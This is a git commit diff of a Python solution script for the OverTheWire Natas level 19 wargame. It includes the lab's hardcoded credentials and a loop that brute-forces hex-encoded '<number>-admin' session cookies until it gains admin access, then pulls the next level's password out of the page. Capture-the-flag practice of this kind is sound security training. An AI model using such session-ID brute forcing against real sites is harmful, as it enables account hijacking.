f0b062bafe103654f2177d5a13b797de89b1cfc2
Taldgan <bananaphone993@live.com>
2020-03-14 16:30:30 -0700

    natas19solution

--- natas/scripts/natas19solution.py
+++ natas/scripts/natas19solution.py
@@ -1,18 +1,21 @@
 import requests
+import codecs
 from requests.auth import HTTPBasicAuth
 
 auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
 param = {'debug':'', 'username':'admin', 'password':''}
-cook = {'PHPSESSID':'0x12312'}
+cook = {'PHPSESSID':''}
 r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
 if r.text.find('DEBUG') != -1:
-    print('Debug!')
+#   print('Debug!')
+    pass
 
-count = 0
+count = 0  
 
 while r.text.find('You are an admin') == -1:
-    cook = {'PHPSESSID':str(count)}
-    print(str(count) + '\n' + r.text)
+    attack = str(count) + '-admin'
+    cook = {'PHPSESSID':attack.encode('utf-8').hex()}
+#   print('PHPSESSID: ' + str(attack.encode('utf-8').hex())  + '\n' + r.text)
     r = requests.get('http://natas19.natas.labs.overthewire.org', auth=auth, params=param, cookies=cook)
     count += 1
 print(r.text[r.text.find('Password: ') + 10:r.text.find('Password: ') + 42])
